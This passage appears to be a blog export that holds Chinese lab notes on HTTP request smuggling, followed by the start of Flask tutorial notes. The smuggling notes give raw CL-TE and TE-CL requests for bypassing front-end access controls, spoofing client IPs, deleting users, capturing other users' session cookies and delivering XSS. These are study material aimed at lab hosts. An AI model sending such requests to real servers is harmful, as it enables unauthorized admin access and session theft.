id="延时"><a href="#延时" class="headerlink" title="延时"></a>延时</h3><p>一般是返回500</p><ul><li>探测CL-TE</li></ul><p>前置服务器发送全部数据到后端,后端服务器没有接收到<code>0\r\n\r\n</code>而等待</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: vulnerable-website.com\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">Content-Length: 4\r\n</span><br><span class="line">\r\n</span><br><span class="line">1\r\n</span><br><span class="line">A\r\n</span><br><span class="line">X</span><br></pre></td></tr></table></figure><ul><li>探测TE-CL</li></ul><p>前置服务器只发送5字节,后端服务器等待第六个字节</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: vulnerable-website.com\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">Content-Length: 6\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">X\r\n</span><br></pre></td></tr></table></figure><h3 id="根据不同的响应"><a href="#根据不同的响应" class="headerlink" title="根据不同的响应"></a>根据不同的响应</h3><ul><li>CL-TE</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /search HTTP/1.1\r\n</span><br><span class="line">Host: vulnerable-website.com\r\n</span><br><span class="line">Content-Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 49\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">e\r\n</span><br><span class="line">q=smuggling&amp;x=\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /404 HTTP/1.1\r\n</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure><p>伪造的相应:返回error</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/404</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Foo</span><span class="punctuation">: </span>xPOST /search HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>11</span><br><span class="line"></span><br><span class="line">q=smuggling</span><br></pre></td></tr></table></figure><ul><li>TE-CL</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /search HTTP/1.1\r\n</span><br><span class="line">Host: vulnerable-website.com\r\n</span><br><span class="line">Content-Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">7c\r\n</span><br><span class="line">GET /404 HTTP/1.1\r\n</span><br><span class="line">Host: vulnerable-website.com\r\n</span><br><span class="line">Content-Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 144\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>或者下面这个,利用的时候不用再计算长度了</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ac991ff81e1155588027028a00a60085.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">5e</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/404</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x-04利用"><a href="#0x-04利用" class="headerlink" title="0x 04利用"></a>0x 04利用</h2><h3 id="bypass防火墙安全控制"><a href="#bypass防火墙安全控制" class="headerlink" title="bypass防火墙安全控制"></a>bypass防火墙安全控制</h3><ul><li>针对CL-TE</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>acfe1fd11efd558780340c0d009d003d.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>116</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"><span class="keyword">GET</span> <span class="string">/admin</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>10</span><br><span class="line"></span><br><span class="line">x=</span><br></pre></td></tr></table></figure><p>特权操作</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>acfe1fd11efd558780340c0d009d003d.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>139</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"><span class="keyword">GET</span> <span class="string">/admin/delete?username=carlos</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>10</span><br><span class="line"></span><br><span class="line">x=</span><br></pre></td></tr></table></figure><ul><li>TE-CL</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ace51f0c1e67808d804d707500860021.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">71</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/admin</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ace51f0c1e67808d804d707500860021.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">71</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/admin</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>10</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ace51f0c1e67808d804d707500860021.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">87</span><br><span class="line"><span class="keyword">GET</span> <span class="string">/admin/delete?username=carlos</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="bypass-ip等限制"><a href="#bypass-ip等限制" class="headerlink" title="bypass  ip等限制"></a>bypass  ip等限制</h3><p>请求头中的一些限制因素</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Host: vulnerable-website.com</span><br><span class="line">X-Forwarded-For: 1.3.3.7</span><br><span class="line">X-Forwarded-Proto: https</span><br><span class="line">X-TLS-Bits: 128</span><br><span class="line">X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256</span><br><span class="line">X-TLS-Version: TLSv1.2</span><br><span class="line">x-nr-external-service: external</span><br><span class="line">...</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>acf01fc11f920726807703ef005a003a.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>143</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"><span class="keyword">GET</span> <span class="string">/admin</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">X-aEWnFO-Ip</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>10</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>acf01fc11f920726807703ef005a003a.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>141</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"><span class="keyword">GET</span> <span class="string">/admin</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Client-ip</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>10</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>acf01fc11f920726807703ef005a003a.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>166</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"><span class="keyword">GET</span> <span class="string">/admin/delete?username=carlos</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">X-aEWnFO-Ip</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>10</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></table></figure><h3 id="窃取信息"><a href="#窃取信息" class="headerlink" title="窃取信息"></a>窃取信息</h3><p>可以捕获别人的请求(cookie,session等)</p><p>利用条件比较苛刻,可参考 <a href="https://xz.aliyun.com/t/7501#toc-9">https://xz.aliyun.com/t/7501#toc-9</a></p><p>首先可以截取一个发送评论的包</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/post/comment</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ac771fff1e7151cd80977b71000800a1.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>400</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=m5fcVJxX7Eqcdq0sE5eccIv4GTQdZILj</span><br><span class="line"></span><br><span class="line">csrf=w7zSB0ypijpVohxpxKcMmKnWQMYNlmrw&amp;postId=1&amp;comment=test&amp;name=1&amp;email=1111%401111.com&amp;website=http%3A%2F%2Fwww.baidu.com%2F</span><br></pre></td></tr></table></figure><p>然后构造下面的数据</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ac771fff1e7151cd80977b71000800a1.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>325</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"><span class="keyword">POST</span> <span class="string">/post/comment</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ac771fff1e7151cd80977b71000800a1.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>665</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=m5fcVJxX7Eqcdq0sE5eccIv4GTQdZILj</span><br><span class="line"></span><br><span class="line">csrf=w7zSB0ypijpVohxpxKcMmKnWQMYNlmrw&amp;postId=3&amp;name=p&amp;email=a%40q.cc&amp;website=http%3A%2F%2Fa.cc&amp;comment=a</span><br></pre></td></tr></table></figure><p>然后可以在评论区看到一些别人的cookie信息(也可能是自己的=.=)</p><p><img src="1612106890243.png" alt="1612106890243"></p><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>63</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line"><span class="attribute">Foo</span><span class="punctuation">: </span>X</span><br></pre></td></tr></table></figure><h3 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h3><p>太懒了…,后面遇到再来做这几个实验</p><ul><li>将 on-site 重定向变为开放式重定向</li><li>缓存投毒</li><li>缓存欺骗</li></ul><h2 id="0x-05-总结"><a href="#0x-05-总结" class="headerlink" title="0x 05 总结"></a>0x 05 总结</h2><p>粗略的学习一下</p><p>CTF中利用可以利用的应该有bypass,和xss. (这两天某比赛就遇到了一个bypass.</p><p>参考 <a href="https://xz.aliyun.com/t/7501">https://xz.aliyun.com/t/7501</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> http </tag>
            
            <tag> web安全 </tag>
            
            <tag> Http请求走私 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>狗书阅读笔记(1)</title>
      <link href="2021/01/22/Flask_basic/"/>
      <url>2021/01/22/Flask_basic/</url>
      
        <content type="html"><![CDATA[<p><img src="1611120563925.png" alt="1611120563925"></p><h2 id="第一章-安装"><a href="#第一章-安装" class="headerlink" title="第一章 安装"></a>第一章 安装</h2><h3 id="virtualenv基本使用"><a href="#virtualenv基本使用" class="headerlink" title="virtualenv基本使用"></a>virtualenv基本使用</h3><p>virtualenv 环境安装 <code>pip install virtualenv </code>/<code>pip3 install virtualenv</code></p><p>安装好后<code>virtualenv --version</code> 可以查看版本</p><p>初始化一个虚拟环境 <code>virtualenv venv-name</code></p><p>进入虚拟环境 <code>source venv-name/bin/activate</code></p><p>退出环境<code>deactivate</code></p><blockquote><p>Python 3.3 通过 venv 模块原生支持虚拟环境，命令为 pyvenv . pyvenv 可以替代 virtualenv </p><p>在 Python 3.3 中使用 pyvenv 命令创建的虚拟环境不包含 pip ，你需要进行手动安装。Python 3.4 改进了这一缺陷， pyvenv 完全可以代替 virtualenv </p><p>pyvenv 使用可以参考 : <a href="https://www.daehub.com/archives/8635.html">https://www.daehub.com/archives/8635.html</a> 两个其实差不多</p></blockquote><h3 id="书中代码使用"><a href="#书中代码使用" class="headerlink" title="书中代码使用"></a>书中代码使用</h3><p>狗书代码地址 <a href="https://github.com/miguelgrinberg/flasky.git">https://github.com/miguelgrinberg/flasky.git</a></p><p>可以git clone到本地 用git checkout切换分支,标签</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/miguelgrinberg/flasky.git</span><br><span class="line">cd flasky</span><br><span class="line">git checkout 1a</span><br></pre></td></tr></table></figure><h2 id="第二章-程序的基本结构"><a href="#第二章-程序的基本结构" class="headerlink" title="第二章 程序的基本结构"></a>第二章 程序的基本结构</h2><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>所有 Flask 程序都必须创建一个程序实例,程序实例是 Flask 类的对象，经常使用下述代码创建</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br></pre></td></tr></table></figure><blockquote><p>Flask 类的构造函数只有一个必须指定的参数，即程序主模块或包的名字。在大多数程序中，Python 的 __name__ 变量就是所需的值</p></blockquote><h3 id="路由和视图函数"><a href="#路由和视图函数" class="headerlink" title="路由和视图函数"></a>路由和视图函数</h3><p>在 Flask 程序中定义路由的最简便方式，就是使用程序实例提供的<code> app.route</code> 修饰器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;Hello World!&lt;/h1&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p>把 index() 函数注册为程序根地址的处理程序,在浏览器中访问 <a href="http://www.example.com/">http://www.example.com</a> 后，会触发服务器执行 index() 函数</p><blockquote><p>这里是使用修饰器把函数注册为一个事件的处理程序</p></blockquote><p>像 index() 这样的函数称为视图函数（view function）, 视图函数返回的响应可以是包含HTML 的简单字符串，也可以是复杂的表单</p><p>下面的示例可以处理更复杂的请求,匹配类似 <code> http://www.facebook.com/&lt;your-name&gt;</code> 的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user</span>(<span class="params">name</span>):</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;Hello, %s!&lt;/h1&gt;&#x27;</span> % name</span><br></pre></td></tr></table></figure><p>路由中的动态部分默认使用字符串,也可以使用别的类型</p><p>如 <code> /user/&lt;int:id&gt;</code>只会匹配动态片段 id 为整数的 URL</p><blockquote><p>Flask 支持在路由中使用 int 、 float 和 path 类型</p><p>path 类型也是字符串，但不把斜线视作分隔符，而将其当作动态片段的一部分</p></blockquote><h3 id="启动服务器"><a href="#启动服务器" class="headerlink" title="启动服务器"></a>启动服务器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><blockquote><p><code>__name__== &#39; __main__ &#39;</code>在这里确保直接执行这个脚本时才启动开发Web 服务器</p></blockquote><p>把 debug 参数设为 True =&gt; 启用调试模式</p><blockquote><p>Flask 提供的 Web 服务器不适合在生产环境中使用,需要搭配别的服务器组件使用</p></blockquote><h3 id="请求-响应循环"><a href="#请求-响应循环" class="headerlink" title="请求-响应循环"></a>请求-响应循环</h3><ul><li>程序和请求上下文</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    user_agent = request.headers.get(<span class="string">&#x27;User-Agent&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;p&gt;Your browser is %s&lt;/p&gt;&#x27;</span> % user_agent</span><br></pre></td></tr></table></figure><p>Flask 